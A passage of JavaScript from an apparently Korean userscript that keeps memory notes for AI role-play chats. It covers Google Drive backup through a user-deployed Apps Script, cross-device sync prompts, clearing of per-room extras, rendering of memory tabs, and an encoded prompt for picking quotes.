      <b>구글 드라이브 백업</b><small>내 구글 드라이브 "조아메모리 백업" 폴더에 방 제목으로 저장돼요</small>
      <label class="gsf"><span>웹 앱 주소</span><input type="text" data-set="gsUrl" autocomplete="off" spellcheck="false" placeholder="https://script.google.com/…/exec"></label>
      <label class="gsf"><span>비밀번호</span><span class="keybox"><input type="password" data-set="gsKey" autocomplete="off" spellcheck="false" placeholder="스크립트의 SECRET"><button type="button" data-act="peek">보기</button></span></label>
      <label class="etcsw"><input type="checkbox" data-act="etcsync"${nav.etcSyncOn ? ' checked' : ''}><i></i><span>ETC(커뮤·폰 등)도 기기끼리 맞추기<small>끄면 기기마다 따로 봐요 · 기억 노트는 켜고 끄기와 상관없이 맞춰져요</small></span></label>
      <button class="btn pri" data-act="gskeep">연결 저장</button>
      <div class="gsrow"><button class="btn" data-act="gsave">지금 저장</button><button class="btn" data-act="gload">불러오기</button></div>
      <details class="gshow"${nav.gsGuide ? ' open' : ''}><summary>처음 연결하는 방법 (한 번만, 5분)</summary><ol>
        <li><button class="btn" data-act="gscode">구글 스크립트 복사</button> 를 눌러요. 내 구글 드라이브에 백업을 받아 줄 작은 프로그램 글이 복사돼요(복사가 막히면 .txt 파일로 받아져요).</li>
        <li>컴퓨터나 폰 브라우저에서 <b>script.google.com</b> 에 들어가 <b>새 프로젝트</b>를 눌러요.</li>
        <li>원래 적혀 있던 글을 다 지우고, 복사한 글을 붙여 넣어요.</li>
        <li>글 안의 <b>SECRET = '여기를-비밀번호로-바꾸세요'</b> 를 나만 아는 비밀번호로 바꾸고 저장(💾)해요.</li>
        <li>오른쪽 위 <b>배포 → 새 배포</b> → 톱니바퀴에서 <b>웹 앱</b> → 실행: <b>나</b> · 액세스: <b>모든 사용자</b> → <b>배포</b>. 처음엔 구글이 권한을 물어요(계정 선택 → 고급 → 이동 → 허용).</li>
        <li>나온 <b>웹 앱 URL</b>(…/exec로 끝나요)을 위 "웹 앱 주소"에, 바꾼 비밀번호를 "비밀번호"에 넣고 <b>연결 저장</b>을 눌러요.</li>
      </ol></details>
    </div></div>`;
  }
  // 안내를 펼친 채로 화면이 다시 그려져도 접히지 않게
  root.addEventListener('toggle', e => { if (e.target.classList?.contains('gshow')) nav.gsGuide = e.target.open; }, true);
  // 노트의 마지막 날짜로그 사건(제목) — 어느 기억인지 내용으로 알아보게
  const lastEvent = mem => { const b = blocksOf(splitSections(mem).find(x => x.key === '날짜로그')?.body || '').pop(); return b ? String(b.title).replace(/^\[|\]$/g, '').replace(/\]?\s*\(요약\)\s*$/, '').replace(/^[^-]*-\s*/, '') : ''; };
  const whenOf = t => t ? new Date(t).toLocaleString('ko-KR', { month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit' }) : '시각 모름';
  const memCol = (label, m, best) => `<div class="dcol${best ? ' best' : ''}"><small>${label}${best ? ' <em>⭐추천</em>' : ''}</small><b>1~${m.turns || '?'}턴</b><small>${esc([m.by, whenOf(m.at)].filter(Boolean).join(' · '))}</small>${lastEvent(m.memory) ? `<p>마지막 사건: “${esc(lastEvent(m.memory))}”</p>` : ''}</div>`;
  function devAskHtml() {
    const l = nav.lostAsk;
    if (l && l.chatId === chatIdFromPath() && (l.local || l.g)) {
      const same = l.local && l.g && l.local.upto === l.g.upto && (l.local.turns || 0) === (l.g.turns || 0);
      const opts = [l.local && ['local', l.local], l.g && !same && ['g', l.g]].filter(Boolean);
      const tOf = c => Date.parse(c.at || c.savedAt || '') || 0;
      const best = opts.slice().sort((x, y) => (y[1].turns || 0) - (x[1].turns || 0) || tOf(y[1]) - tOf(x[1]))[0][0];
      const label = c => c.src === 'g' ? '구글 백업' : c.src === 'full' ? '이 기기에서 정리한 기억' : c.src === 'seen' ? '이 기기 사본' : '이 기기 정리 기록';
      const col = ([w, c]) => `<div class="dcol${w === best ? ' best' : ''}"><small>${label(c)}${w === best ? ' <em>⭐추천</em>' : ''}</small><b>1~${c.turns || '?'}턴</b>
        <small>정리: ${esc([c.by, whenOf(c.at)].filter(Boolean).join(' · '))}</small>${c.src !== 'full' && c.savedAt ? `<small>사본 저장: ${esc([c.savedBy, whenOf(c.savedAt)].filter(Boolean).join(' · '))}</small>` : ''}
        ${lastEvent(c.memory) ? `<p>마지막 사건: “${esc(lastEvent(c.memory))}”</p>` : ''}</div>`;
      const other = opts.find(([w]) => w !== best);
      return `<div class="devask"><b>채팅에서 기억이 사라졌어요</b>
      <div class="dcols">${opts.map(col).join('')}</div>
      <div class="devask-btns"><button class="btn pri" data-act="lostput" data-arg="${best}"${busyNow ? ' disabled' : ''}>1~${(best === 'g' ? l.g : l.local).turns || '?'}턴 기억 다시 넣기</button></div>
      <p class="dsmall">${other ? `<button class="linkbtn" data-act="lostput" data-arg="${other[0]}">1~${other[1].turns || '?'}턴 넣기</button> · ` : ''}<button class="linkbtn" data-act="lostskip">그냥 두기</button></p>
      ${nav.gsOn ? '' : '<p class="dsmall">구글 드라이브 백업을 연결해 두면 다른 기기에서 지워져도 복구돼요(설정 › 백업)</p>'}</div>`;
    }
    const a = nav.devAsk; if (!a || a.chatId !== chatIdFromPath()) return '';
    // 턴이 더 많은 쪽, 같으면 더 최근에 정리한 쪽을 추천
    const chatBest = (a.c.turns || 0) > (a.mine.turns || 0) || ((a.c.turns || 0) === (a.mine.turns || 0) && Date.parse(a.c.at || 0) >= Date.parse(a.mine.at || 0));
    return `<div class="devask"><b>다른 기기에서 정리했어요</b>
      <div class="dcols">${memCol('채팅에 있는 기억', a.c, chatBest)}${memCol('이 기기 기억', { ...a.mine, by: a.mine.by || '이 기기' }, !chatBest)}</div>
      ${a.mine.turns && a.c.turns < a.mine.turns ? '<p class="warn">⚠ 채팅에 있는 기억이 더 예전 거예요</p>' : ''}
      <div class="devask-btns"><button class="btn${chatBest ? ' pri' : ''}" data-act="devkeep"${busyNow ? ' disabled' : ''}>1~${a.c.turns}턴 쓰기</button><button class="btn${chatBest ? '' : ' pri'}" data-act="devrestore"${busyNow ? ' disabled' : ''}>1~${a.mine.turns || '?'}턴으로 바꾸기</button></div></div>`;
  }
  function fullAskHtml() {
    const f = nav.fullAsk; if (!f || f.chatId !== chatIdFromPath()) return '';
    return `<div class="devask"><b>근거·감정선 전체를 받아올까요?</b>
      <p>구글 백업에 지금 기억(1~${f.n.turns}턴)과 같은 정리본의 근거·감정선 전체가 있어요. 받아도 채팅 노트는 바뀌지 않고, 이 기기 화면에서 근거 버튼·감정선 단계가 보이게 돼요.</p>
      <div class="devask-btns"><button class="btn pri" data-act="fullget">받기</button><button class="btn" data-act="fullskip">괜찮아요</button></div></div>`;
  }
  async function lostPut(which = 'local') {
    const a = nav.lostAsk, l = a?.[which], chatId = chatIdFromPath(); if (!l || a.chatId !== chatId || busyNow) return;
    busyNow = true; render();
    try {
      const snap = await readSinceLastNote(chatId), carrier = pickCarrier(snap.all);
      if (!carrier) throw new Error('노트를 붙일 AI 답변을 찾지 못했어요.');
      await writeMessage(chatId, msgId(carrier), stripBlocks(msgText(carrier)).trimEnd() + buildBlock(l.memory, l.upto, l.turns || 1, l.at || undefined, l.by || ''));
      await saveFull(chatId, l.upto, l.memory, l.turns, l.at);
      nav.lostAsk = null; pageToast(`1~${l.turns || '?'}턴 기억을 다시 넣었어요`);
    } catch (e) { toast('다시 넣기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; }
    await refresh();
    if (nav.gsOn) gsSave(true); // 구멍 2: 노트가 바뀌면 구글도 최신으로
  }
  async function devChoose(restore) {
    const a = nav.devAsk, chatId = chatIdFromPath(); if (!a || a.chatId !== chatId || busyNow) return;
    busyNow = true; render();
    try {
      if (!restore) { fullNote = null; await setValue('full:' + chatId, ''); nav.fullTried = ''; pageToast(`채팅에 있는 기억(1~${a.c.turns}턴)을 써요`); }
      else {
        const snap = await readSinceLastNote(chatId), c = snap.note || a.c, mine = a.mine, carrier = pickCarrier(snap.all);
        if (!carrier) throw new Error('노트를 붙일 AI 답변을 찾지 못했어요.');
        await writeMessage(chatId, msgId(carrier), stripBlocks(msgText(carrier)).trimEnd() + buildBlock(mine.memory, mine.upto, mine.turns || c.turns, mine.at || undefined, mine.by || ''));
        if (c.carrierId && c.carrierId !== msgId(carrier)) {
          const other = await readMessage(chatId, c.carrierId), cleaned = stripBlocks(msgText(other)).trimEnd();
          if (cleaned !== msgText(other)) await writeMessage(chatId, c.carrierId, cleaned);
        }
        if (mine.full) await saveFull(chatId, mine.upto, mine.memory, mine.turns, mine.at);
        pageToast(`이 기기 기억(1~${mine.turns || c.turns}턴)으로 되돌렸어요`);
      }
      nav.devAsk = null;
    } catch (e) { toast('바꾸기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; }
    await refresh();
    if (nav.gsOn) gsSave(true);
  }
  // ETC 비우기: 커뮤·폰·컴퓨터·뉴스·위키·실시간톡을 골라 이 방에서 지워요. 기억 노트·명대사·정리 기록은 그대로.
  const ETC_PARTS = [['board', '🗨 커뮤니티'], ['phone', '📱 폰'], ['pc', '💻 컴퓨터'], ['news', '📰 뉴스'], ['wiki', '📚 위키'], ['live', '📺 실시간톡']];
  function etcSheetHtml() {
    return `<div class="rsheet" data-act="etcclose"><div class="rbox gsbox" data-act="noop">
      <b>ETC 비우기</b><small>고른 것만 이 방에서 지워요 · 기억 노트·명대사·정리 기록은 그대로</small>
      <div class="etcgrid">${ETC_PARTS.map(([k, l]) => `<button class="btn" data-act="etcwipe" data-arg="${k}">${l}</button>`).join('')}</div>
      <button class="btn etcall" data-act="etcwipe" data-arg="all">ETC 전체 비우기</button>
      <small>${nav.gsOn ? '구글 드라이브 백업에서도 같이 지워요(되돌릴 수 없어요)' : '되돌릴 수 없어요. 필요하면 먼저 "이 방 전체 내보내기"를 해 두세요'}</small>
    </div></div>`;
  }
  async function etcWipe(which) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow) return;
    const parts = which === 'all' ? ETC_PARTS : ETC_PARTS.filter(([k]) => k === which); if (!parts.length) return;
    if (!confirm(`${parts.map(([, l]) => l).join(' · ')}${which === 'all' ? '\n(ETC 전체)' : ''}\n\n이 방에서 지울까요? 기억 노트는 그대로예요.`)) return;
    busyNow = true; render();
    try {
      etcQuiet = true; // 비운 건 구글로 안 올려요(지우기 직전 백업을 남겨 두려고)
      try { for (const [k] of parts) await setValue(k + ':' + chatId, ''); if (which === 'all') await setValue('etcnames:' + chatId, ''); } finally { etcQuiet = false; }
      await setValue('etcAt:' + chatId, new Date(Date.now() + 1000).toISOString()); nav.etcAsk = null;
      if (nav.gsOn) await gsSave(true); // 구글 백업에서도 지운 상태로(다시 불러와지지 않게)
      nav.etcSheet = false; nav.bdPost = null; nav.bdBoard = '';
      toast(`${which === 'all' ? 'ETC 전체를' : parts[0][1].replace(/^\S+\s/, '') + ' 기록을'} 비웠어요`, 'ok', 3000);
    } catch (e) { toast('비우기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; }
    await refresh();
  }
  // ── ETC 기기끼리 맞추기 (기본 꺼짐) ──
  //   켜면: ETC가 바뀔 때마다 8초 뒤 구글에 올리고(여러 번 바뀌면 한 번만), 다른 기기 ETC가 더 최신이면 카드로 알려요(말없이 덮어쓰지 않음).
  const ETC_SYNC_KEYS = ['board', 'phone', 'pc', 'news', 'wiki', 'live', 'quotes', 'etcnames'];
  let etcUpTimer = null;
  etcHook = async key => {
    const chatId = chatIdFromPath(); if (!chatId || !key.endsWith(':' + chatId)) return;
    await setValue('etcAt:' + chatId, new Date().toISOString());
    if (String(await getValue('etcSync', 'off')) !== 'on' || !nav.gsOn) return;
    clearTimeout(etcUpTimer); etcUpTimer = setTimeout(() => gsSave(true), 8000);
  };
  async function etcCheck(chatId) {
    if (String(await getValue('etcSync', 'off')) !== 'on' || !nav.gsOn) return;
    if (Date.now() - (nav.etcCheckAt || 0) < 120000 && nav.etcCheckRoom === chatId) return; // 2분에 한 번만
    nav.etcCheckAt = Date.now(); nav.etcCheckRoom = chatId;
    const d = await gsFetch(chatId); if (!d?.store || chatIdFromPath() !== chatId) return;
    const mineAt = Date.parse(String(await getValue('etcAt:' + chatId, '')) || '') || 0, theirAt = Date.parse(d.at) || 0;
    if (theirAt <= mineAt || String(await getValue('etcSkip:' + chatId, '')) === d.at) return;
    let differs = false; for (const k of ETC_SYNC_KEYS) if ((d.store[k] || '') !== String(await getValue(k + ':' + chatId, '') || '')) { differs = true; break; }
    if (!differs) { await setValue('etcAt:' + chatId, d.at); return; }
    if (nav.etcAsk?.chatId === chatId && nav.etcAsk.at === d.at) return; // 같은 걸로 이미 카드가 떠 있으면 다시 안 알림
    nav.etcAsk = { chatId, at: d.at, by: d.by || '', store: d.store }; pageToast('다른 기기 ETC(커뮤·폰 등)가 더 최신이에요 · 조아메모리에서 받을 수 있어요'); render();
  }
  async function etcMineLoad(chatId) { const m = {}; for (const k of ETC_SYNC_KEYS) m[k] = !!(await getValue(k + ':' + chatId, '')); nav.etcMine = m; }
  async function etcFirst() {
    const chatId = chatIdFromPath(); if (!chatId || !nav.gsOn) return;
    const d = await gsFetch(chatId); let differs = false;
    if (d?.store) for (const k of ETC_SYNC_KEYS) if ((d.store[k] || '') !== String(await getValue(k + ':' + chatId, '') || '')) { differs = true; break; }
    const theirHas = d?.store && ETC_SYNC_KEYS.some(k => d.store[k]);
    if (differs && theirHas) { await etcMineLoad(chatId); nav.etcAsk = { chatId, at: d.at, by: d.by || '', store: d.store, first: true }; nav.gsSheet = false; render(); }
    else gsSave(true);
  }
  function etcAskHtml() {
    const e = nav.etcAsk; if (!e || e.chatId !== chatIdFromPath()) return '';
    const has = ETC_PARTS.filter(([k]) => e.store[k]).map(([, l]) => l).join(' · ') || 'ETC';
    const mine = ETC_PARTS.filter(([k]) => nav.etcMine?.[k]).map(([, l]) => l).join(' · ');
    if (e.first) return `<div class="devask"><b>ETC를 어느 쪽으로 맞출까요?</b>
      <p>기기마다 커뮤·폰 등이 달라요. 한 번만 고르면 그다음부터는 자동으로 맞춰져요.</p>
      <div class="dcols"><div class="dcol"><small>구글(다른 기기)</small><b style="font-size:15px">${esc(e.by || '다른 기기')}</b><small>${esc(whenOf(e.at))} 올림</small><p>${esc(has)}</p></div>
        <div class="dcol"><small>이 기기</small><b style="font-size:15px">${esc(DEVICE)}</b><small>지금 이 기기에 있는 것</small><p>${esc(mine || '비어 있음')}</p></div></div>
      <div class="devask-btns"><button class="btn" data-act="etcpull"${busyNow ? ' disabled' : ''}>구글 것으로 맞추기</button><button class="btn" data-act="etcskip">이 기기 것으로 맞추기</button></div></div>`;
    return `<div class="devask"><b>다른 기기 ETC가 더 최신이에요</b>
      <p>${esc([e.by, whenOf(e.at)].filter(Boolean).join(' · '))}에 올린 것 · ${esc(has)}</p>
      <div class="devask-btns"><button class="btn pri" data-act="etcpull"${busyNow ? ' disabled' : ''}>받아서 이 기기에 맞추기</button><button class="btn" data-act="etcskip">이 기기 것 유지</button></div></div>`;
  }
  async function etcPull(take) {
    const e = nav.etcAsk, chatId = chatIdFromPath(); if (!e || e.chatId !== chatId) return;
    if (!take) { await setValue('etcSkip:' + chatId, e.at); nav.etcAsk = null; if (e.first) { await setValue('etcAt:' + chatId, new Date().toISOString()); gsSave(true); toast('이 기기 ETC로 맞췄어요(구글에 올렸어요)', 'ok', 3000); } return render(); }
    etcQuiet = true;
    try { for (const k of ETC_SYNC_KEYS) await setValue(k + ':' + chatId, e.store[k] || ''); await setValue('etcAt:' + chatId, e.at); }
    finally { etcQuiet = false; }
    nav.etcAsk = null; toast('다른 기기 ETC를 받아 왔어요', 'ok', 3000); await refresh();
  }
  async function gsKeep() {
    for (const k of ['gsUrl', 'gsKey']) { const el = ui(`[data-set="${k}"]`); if (el) await setValue(k, el.value.trim()); }
    nav.gsOn = !!String(await getValue('gsUrl', '')).trim();
    try { await gsCall({ action: 'ping' }); toast('구글 드라이브에 연결했어요. 이제 넣을 때마다 자동으로 올라가요.', 'ok', 4000); nav.gsSheet = false; render(); }
    catch (e) { toast('연결 확인 실패 · ' + e.message, 'err', 6000); }
  }
  async function gsCopyCode() {
    let copied = false; try { await navigator.clipboard.writeText(GS_CODE); copied = true; } catch (_) {}
    if (!copied) downloadText('조아메모리-구글백업-스크립트.txt', GS_CODE);
    toast(copied ? '구글 스크립트를 복사했어요. 이제 2번(script.google.com 새 프로젝트)으로 가세요.' : '구글 스크립트를 파일로 받았어요. 열어서 통째로 복사해 붙여 넣으세요.', 'ok', 6000);
  }

  // 정리 기록: 기억의 실 · 비용 · 회차별 막대
  function historyHtml() {
    if (!snapshot?.note) return emptyBox('아직 정리한 기록이 없어요.');
    const totalUsd = usage.reduce((a, r) => a + (r.usd || 0), 0), runs = usage.filter(r => !r.label).length;
    return `<h4 class="sg">이어진 기억</h4>${threadHtml()}
      ${movedInfo ? `<p class="muted">마지막 자동 옮김 · ${esc(movedInfo)}</p>` : ''}
      <h4 class="sg">쓴 돈</h4>
      <p class="item-text" style="margin-top:4px">${usage.length ? `이 방에서 약 ${fmt(won(totalUsd))}원 ($${totalUsd.toFixed(3)})${runs ? ` · 정리 ${runs}번` : ''}` : '아직 쓴 돈이 없어요.'}</p>
      <p class="muted" style="margin-top:4px">정리·폰·명대사 모두 합친 금액 · 1달러 = 1,400원으로 어림</p>
      <p class="muted" style="margin-top:8px">근거·감정선·명대사는 이 브라우저에만 저장돼요. 기기를 바꾸기 전에 내보내 두세요.</p>`;
  }

  // ── 기억 ──
  function memoryHtml(tabs = STORY_TABS) {
    if (!snapshot?.note) return emptyBox('아직 정리한 기억이 없어요.<br>확인 탭에서 "지금 정리"를 눌러 주세요.');
    if (!tabs.includes(nav.mem)) nav.mem = tabs[0];
    const k = nav.mem, body = bodyOf(k);
    const seg = `<div class="seg">${tabs.map(t => `<button data-act="mem" data-arg="${esc(t)}" aria-pressed="${t === k}">${esc(secInfo(t).short)}</button>`).join('')}</div>`;
    if (k === '의상') return peopleHtml('outfit', seg);
    const head = txt => descHtml(k) + `<div class="sechead"><span>${txt}</span><button class="linkbtn" data-act="edit" data-arg="${esc(k)}">${icon('note', 'currentColor', 14)}고치기</button></div>`;
    const li = l => {
      const ev = l.match(/^근거\s*[:：]\s*(.*)$/);
      if (ev) return `<li class="evq">${quoteHtml(ev[1].replace(/^["“]|["”]$/g, ''))}</li>`;
      const tr = l.match(/^번역\s*[:：]\s*(.*)$/);
      if (tr) return `<li class="trl">${esc(tr[1].replace(/^["“]|["”]$/g, ''))}</li>`;
      const hist = l.match(/^내력\s*[:：]\s*(.*)$/);
      if (hist) return `<li class="hist"><b>내력</b><span>${hist[1].split(/\s*→\s*/).map(x => `<em>${esc(x)}</em>`).join('<i>→</i>')}</span></li>`;
      const i = labelCut(l); return i > 0 ? `<li><b>${esc(l.slice(0, i))}</b> ${esc(l.slice(i + 1).trim())}</li>` : `<li>${esc(l)}</li>`;
    };

    if (k === '날짜로그') {
      const bl = blocksOf(body).reverse();
      return seg + head(`사건 ${bl.length}개 · 최근 사건이 위에 있어요`) + (bl.length ? `<div class="tl">${bl.map((b, i) => {
        const packed = /\(요약\)/.test(b.title || '');
        const m = (b.title || '').replace(/\s*\(요약\)\s*$/, '').match(/^\[?([^\]\-]+?)\s*-\s*(.+?)\]?$/);
        const date = m ? m[1] : '', name = m ? m[2] : (b.title || '사건').replace(/^\[|\]$/g, '');
        const q = b.lines.find(l => /^근거\s*[:：]/.test(l)), lines = b.lines.filter(l => l !== q);
        return `<div class="ev${i > 2 || packed ? ' old' : ''}">${date || packed ? `<div class="date">${esc(date)}${packed || date.includes('~') ? '<span class="packed">줄여 둠</span>' : ''}</div>` : ''}<b>${esc(name)}</b>
          ${lines.map(l => `<p>${esc(l)}</p>`).join('')}${q ? quoteHtml(q.replace(/^근거\s*[:：]\s*/, '').replace(/^["“]|["”]$/g, '')) : ''}</div>`;
      }).join('')}</div>` : emptyBox('아직 사건이 없어요.'));
    }
    if (k === '명대사') {
      const qs = quotes();
      const userNames = new Set(persons().filter(x => x.isUser).map(x => x.name));
      const norm = t => String(t).replace(/[\s"“”'‘’.,!?…~\-—()（）]/g, '');
      const userText = norm((snapshot?.all || []).filter(m => msgRole(m) === 'user').map(m => stripBlocks(msgText(m))).join('\n'));
      const aiText = norm((snapshot?.all || []).filter(m => msgRole(m) === 'assistant').map(m => stripBlocks(msgText(m))).join('\n'));
      for (let i = qs.length - 1; i >= 0; i--) {
        const key = norm(splitTr(qs[i].text)[0]);
        if (userNames.has(qs[i].who) || (key.length >= 4 && userText.includes(key) && !aiText.includes(key))) qs.splice(i, 1);
      }
      const pick = `<button class="btn sm pri qmake" data-act="qmake"${busyNow ? ' disabled' : ''}>${busyNow ? '고르는 중…' : '✨ 새 대사에서 명대사 뽑기'}</button><p class="muted" style="margin:4px 0 12px">지난번 뽑은 뒤의 대화에서 3~5개 · AI 1번 · 정리할 때는 만들지 않아요</p>`;
      return seg + head(`대사 ${qs.length}개`) + pick + (qs.length ? qs.map(q => `<figure class="kq" style="--qbg:${avColor(q.who || '?')[0]};--qfg:${avColor(q.who || '?')[1]}">
          ${(() => { const [orig, inl] = splitTr(q.text), tr = q.tr || inl;
            return `<blockquote><mark>${esc(orig)}</mark></blockquote>${tr ? `<p class="kq-tr">${esc(tr)}</p>` : ''}${q.ctx ? `<p class="kq-ctx">🎬 ${esc(q.ctx)}</p>` : ''}`; })()}
          ${q.who ? `<figcaption>${avatar(q.who)}<span>${esc(q.who)}${q.to ? ` <i class="arr">→</i> ${esc(q.to)}` : ''}</span></figcaption>` : ''}</figure>`).join('')
        : emptyBox('위 버튼을 누르면 고백·맹세·약속처럼 다시 떠올릴 대사를 원문 그대로 골라 와요.'));
    }
    if (k === FIXED) {
      const bl = blocksOf(body);
      return seg + head('직접 쓰는 칸 · AI가 고치지 않아요') + (bl.length ? bl.map(b => `<section class="blk">${b.title ? `<h4>${esc(b.title)}</h4>` : ''}<ul>${b.lines.map(li).join('')}</ul></section>`).join('')
        : emptyBox('성격·말투·세계관처럼 절대 바뀌면 안 되는 설정을 적어 두세요.<br>정리할 때 AI가 이걸 기준으로 삼아요.<br><br><button class="btn sm pri" data-act="edit" data-arg="' + esc(FIXED) + '">고정 설정 쓰기</button>'));
    }
    // 현재상태의 옷차림·소지품 소제목은 의상·소지품 탭에 따로 있으니 여기선 뺍니다 (두 번 나오지 않게).
    if (k === '현재상태') return seg + head(`${snapshot.note.turns}턴 시점 · 지금 이 순간`) + nowHtml(body, li);
    const bl = blocksOf(body);
    // 소지품은 지금 가진 사람별로, 장소·조직은 장소/조직으로 묶습니다. 묶음 제목 = 얼굴+이름(사람) 또는 글자(장소·조직), 그 아래 접힌 줄
    const locOf = b => (String(b.title || '').match(/\(([^)]*)\)\s*$/) || [])[1] || '';
    // 위에 동그라미를 가로로 쭉(타임라인 얼굴 줄과 같은 모양): 전체 + 묶음마다 하나. 누르면 그 묶음만
    const ICON_OF = { '놓인 곳': '📦', '장소': '🏠', '조직': '🏛', '메모': '📝' };
    const groupHtml = (groups, rowOf) => {
      const cur = groups.has(nav.grp) ? nav.grp : '';
      const circle = (g, face, n) => `<button data-act="grp" data-arg="${esc(g)}" aria-pressed="${g === cur}">${face}<small>${esc(g || '전체')}</small></button>`;
      const row = `<div class="tl-who">${circle('', '<span class="av tl-all">✦</span>', 0)}${[...groups].map(([g, list]) => circle(g, people().has(g) ? avatar(g) : `<span class="av tl-all">${ICON_OF[g] || '•'}</span>`, list.length)).join('')}</div>`;
      return row + `<div class="fkeep">${(cur ? groups.get(cur) : [...groups.values()].flat()).map(rowOf).join('')}</div>`;
    };
    if (k === '소지품') {
      const names = [...people().keys()].sort((a, b) => b.length - a.length), groups = new Map();
      for (const b of bl) { const loc = locOf(b), g = names.find(n => personAlias(n).some(a => loc.includes(a))) || (b.title ? '놓인 곳' : '메모');
        if (!groups.has(g)) groups.set(g, []); groups.get(g).push(b); }
      return seg + head(`${bl.length}개 물건 · 지금 가진 사람별로`) + (bl.length ? groupHtml(groups, b => b.title
        ? fold(`<b>${esc(itemName(b.title))}</b>`, locOf(b) ? whereIcon(locOf(b)) + locOf(b) : '', itemBody(b, true)) : blkHtml(b, li)) : emptyBox('아직 내용이 없어요.'));
    }
    if (k === '장소·조직') {
      const groups = new Map();
      for (const b of bl) { const g = /조직|단체|세력|회사|기관/.test(locOf(b)) ? '조직' : b.title ? '장소' : '메모'; if (!groups.has(g)) groups.set(g, []); groups.get(g).push(b); }
      return seg + head(`${bl.length}개 · 장소와 조직으로`) + (bl.length ? groupHtml(groups, b => b.title
        ? fold(`<b>${esc(itemName(b.title))}</b>`, placePeek(b), placeBody(b, true)) : blkHtml(b, li)) : emptyBox('아직 내용이 없어요.'));
    }
    const hasTitles = bl.some(b => b.title);
    return seg + head(hasTitles ? `${bl.length}개 항목 · 눌러서 펼치기` : `${itemsOf(body).length}줄`) + (bl.length ? bl.map(b => blkHtml(b, li)).join('') : emptyBox('아직 내용이 없어요.'));
  }
  // 접었다 펴는 칸. 접힌 상태에선 제목 + 첫 줄 미리보기만 보여요.
  const fold = (titleHtml, preview, bodyHtml, open = false) => `<details class="fold"${open ? ' open' : ''}><summary><span class="fold-t">${titleHtml}${preview ? `<small>${esc(preview)}</small>` : ''}</span></summary><div class="fold-b">${bodyHtml}</div></details>`;
  const firstLine = lines => (lines.find(l => !/^(근거|번역|내력)\s*[:：]/.test(l)) || '').replace(/^상태\s*[:：]\s*/, '');
  const blkHtml = (b, li) => b.title ? fold(`<b>${esc(b.title)}</b>`, firstLine(b.lines), `<ul class="fold-ul">${b.lines.map(li).join('')}</ul>`)
    : `<section class="blk"><ul>${b.lines.map(li).join('')}</ul></section>`;

  // ── 📱 폰: 인물마다 아이폰 속(인스타·메시지·당근·메모)을 성격·서사에 맞춰 만들어 구경 ──
  //    버튼을 눌렀을 때만 AI를 부르고, 결과는 이 브라우저에만 저장합니다. 기억 노트·채팅에는 들어가지 않아요.
  // ── ✨ 명대사 뽑기: 정리와 따로, 버튼을 눌렀을 때만. 지난번 뽑은 뒤의 대화(처음이면 최근 100개 메시지)에서 고릅니다 ──
  const QUOTE_PROMPT = unveil('gevphu/5T57niNiIghY4P4369YHr7lnGuZTevfZPit7Rh9zSWcG5ht6r6k+Kx+CG4/KVr57bl4pKhdLNjsjbmfO5Et28jobI8IH7/YT53QMSYmLdz9NBgfjZg+TNDd6jgtrN70GB8OeE+O3GuZQcPDGF0s2OyNuZ87kS2oqGhsvhMG9ATyk4ZG8Q2Z/+g+rxicrvUpWrvxDeteuE7e1FgdXikouf3baGhvL5TY7h7577gd6notru84rK6U2FwdnGl4jZvc5BQTYwPiogJA3Zmaba4fONyuVFg/DVwaiZ3qj6T43X9YbJ35SpgtyvrkqExv2n2oLk8Ma9qRvd4PtBh9bNhNfNwZWwEtr/5Yrn8Ybk1lcnHxDYhcqE0dyn2oTVwMG2iPCBhvrcgePgrcWVsIbbgbKo2Iz19Ibf55WfqtutikZPivX1huXmWcGSpd6E3oTE0UWG3++Us7rag4aB7flNR4H43pOVgtqLuobI4U+O8NOYyo0S3LaWhvLlTY/V5JnzuRLblaaG3fmG+tFDUpOaihDZmtKD/8hFh9jKkqGy25OqSoTqyYnm81KTl47bsIJKhNLZj97PUpWmhNyvtkqE7e2J78NcWceFiBLa0P+Ky8iA68KSppbcqIJKhMb9iOXDmMmtEtywgob65U2J8+eZ87kS2762hu3NQUWH3+KVjafcr4JKguXdicrvmfO5Ety6qoDf5UFFht/qkp6H26KugeX1TY7K/5nLqdmWtfTdg/TNidTCmfapEtyQvYHkxUNvQE+e2bjZg4bdzeNBgcXpgufhxrikEt3m743vyUVNnu+Z2aSmFoDf4VJHQU9Qlbi+2oCWhvnVgf/5TVtVDd+/u93Y+4z4+U2D78HBsJzwgYHj4Ybu2IPv+Q3Yg5Ldz9uNyuVNg+fzxrik2b3OQUGG3OmD+M7Ap6wS3ebvje/Jh9/yWcGlnNmpxk+L3fmGxsZZx4Kw3qjPT4vd8ID67lnAp6jZtPKExuFLZ0JSlLiuENmf/oPq8YnK71KVuLrcpaZKg+rJic3zmdixEtyvgob51YHF1U+e56XZuqYWgcPZgfvIg+/9DdiIstr0/6PajvDrnu+Z3qOC3NLfo9qOwdee54jZhrLb8tej2o/Z65/hlRLbgL6G+MyH3OGD1fkN2IeK3ebvisz5TYTBzMGwnN+j9oTqyU2G3fqVup/yhdr39436yK/Yn+yE3omq3NLfo9qP2euf4ZUS26SKgNfRTY/V557erRseEt3N/4z4+U2D8NXGrLzeq96E4/VFgezzlLSb3K+ySoL4+InN+p/sjRLcuq5Kg/brifHTmdCZEtqBloHK1YHC7U+e7KfZuqbd4ctPZz6A9+eVpq9tEt3m743vyU2C5+HGsKgSC0qE8P1Fgcv2cwAS3auihvHxTYfr/VKVrrPbvrZQT0OB/v2E3sEN2byy2ujDQ01FTY306Q3fsZ7d9PZBhsTxhcXBwaWgEtrK7ozz6U2FxcHGvrDZl/ZBQYH81YXH1MGkhBLd5u+N78mG5eZZzrK8el9KR4347Ybq51DOsr3ehPKE/tFFh9v2lLWKENmE4oP2wInw21KVsIbbnY5KhNf0ifvbUpWzutyuioHk6U2P2euf4ZXYib7aze9BgOPYg9XBxpOsEt3Z2o3vyYD67pKmljofFobxxIbM2VVSkq+S3JWqSq3WTYnzyp7/oRLyhRaG+dWG88lPnvGx2IC22v3/QYDw8U+Z3r3erYraze9BgPDxT57dqRoCB9r0/0GB8OWC/vcBEt2ngobr/K/SgOD7k52yEN6h7IP82UxnNJ/sjRLcr4o3TzqH3d2D080N2Zq33ebvje/JMIT47Q3Yh4rd5u+KzPlNhOPpx4GQHhYxg+LlRT8/UpKMrtqFjjeD9v2J6fNSla6625OqSlwfWI/d85neoRLagZ6B8t1Njv/Lnu69EtuEr4by2U2Jzeuey5kS2